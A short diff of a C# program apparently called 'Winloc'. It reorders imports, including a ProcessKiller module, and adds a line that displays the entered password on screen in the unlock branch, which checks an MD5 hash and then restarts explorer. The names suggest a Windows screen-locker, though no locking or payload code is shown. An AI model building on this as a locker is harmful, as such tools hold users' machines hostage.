@@ -1,15 +1,12 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
-using System.Windows;
+﻿using ProcessKiller;
+using System;
+using System.Diagnostics;
 using System.IO;
 using System.Security.Cryptography;
-using System.Windows.Forms;
-using ProcessKiller;
+using System.Text;
 using System.Threading;
-using System.Diagnostics;
+using System.Threading.Tasks;
+using System.Windows.Forms;
 
 namespace Winloc
 {
@@ -37,6 +34,7 @@ namespace Winloc
 
             if (pass == Convert.ToBase64String(md5))
             {
+                MessageBox.Show(pass);
                 MessageBox.Show("Пароль верный!", "Уря!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                 Closing = true;
                 Process.Start("explorer");
